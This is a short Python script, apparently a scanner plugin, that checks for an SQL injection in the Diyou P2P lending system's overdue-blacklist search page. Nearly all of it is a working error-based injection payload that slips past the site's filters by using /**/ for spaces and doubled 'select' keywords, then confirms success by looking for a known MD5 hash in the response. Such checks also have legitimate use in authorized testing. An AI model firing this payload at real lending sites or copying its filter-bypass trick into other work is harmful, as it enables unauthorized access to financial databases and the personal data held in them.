# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
class dyp2p_latesindex_sqli(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'esccms',
            'vuln_title':'dyp2p_latesindex_sqli',
            'vuln_level':1,
            'vuln_type':1,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'帝友P2P借贷系统/lates/index.html逾期黑名单搜索处过滤了select和空格，利用/**/和双写select可以绕过',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = "/lates/index.html?username=123%27/**/and/**/(seleselectct/**/1/**/from/**/(selselectect/**/count(*),concat(0x7e,MD5(%271234%27),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23"
        vulnurl = self.result['url'] + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = dyp2p_latesindex_sqli("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)